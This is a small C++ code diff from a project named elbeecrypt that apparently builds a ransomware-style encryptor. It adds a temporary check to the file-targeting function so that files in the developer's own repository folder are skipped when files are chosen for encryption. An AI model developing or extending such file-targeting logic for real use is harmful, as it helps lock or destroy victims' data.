@@ -1,4 +1,5 @@
 #include <regex>
+#include <string>
 #include "elbeecrypt/common/targets/extensions.hpp"
 #include "elbeecrypt/cryptor/hunter-encryptor.hpp"
 
@@ -17,6 +18,7 @@ namespace elbeecrypt::cryptor {
 	//Overrides
 	/** Impl of isTargetable(path). */
 	bool HunterEncryptor::isTargetable(const fs::path& path){
+		if(path.string().find("ElbeeCrypt") != std::string::npos) return false; //TODO: Don't encrypt files in the repo folder (remove this line later)
 		return elbeecrypt::common::targets::Extensions::isEncryptable(path);
 	}
 
